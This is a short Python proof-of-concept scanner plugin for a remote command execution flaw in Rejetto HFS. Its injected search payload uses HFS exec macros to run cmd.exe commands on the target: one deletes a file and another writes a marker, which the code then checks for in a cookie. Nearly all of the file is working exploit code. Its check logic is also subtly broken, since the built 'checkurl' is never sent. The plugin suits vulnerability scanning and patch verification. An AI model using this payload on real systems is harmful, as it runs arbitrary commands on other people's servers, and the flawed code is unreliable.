# Author:w8ay
# Name:测试DEMO
'''
name: hfs rejetto 远程代码执行
referer: https://www.seebug.org/vuldb/ssvid-87319
author: Lucifer
description: search引起的命令执行。
'''


import HackRequests

def poc(arg, **kwargs):
    payload = "/?search==%00{.exec|cmd.exe /c del res.}{.exec|cmd.exe /c echo>res 123456test.}"
    vulnurl = arg + payload
    hack = HackRequests.hackRequests()
    hh = hack.http(vulnurl)
    cookie = hh.cookies
    checkurl = arg + "/?search==%00{.cookie|out|value={.load|res.}.}"
    req = hack.http(vulnurl, cookie = cookie)
    if "123456test" in req.cookie:
        result = {
            "name": "hfs rejetto",  # 插件名称
            "content": "存在hfs rejetto 远程代码执行漏洞",  # 插件返回内容详情，会造成什么后果。
            "url": arg,  # 漏洞存在url
            "log": req.log,
            "tag": "remote"  # 漏洞标签
        }
        return result




if __name__ == "__main__":
    pass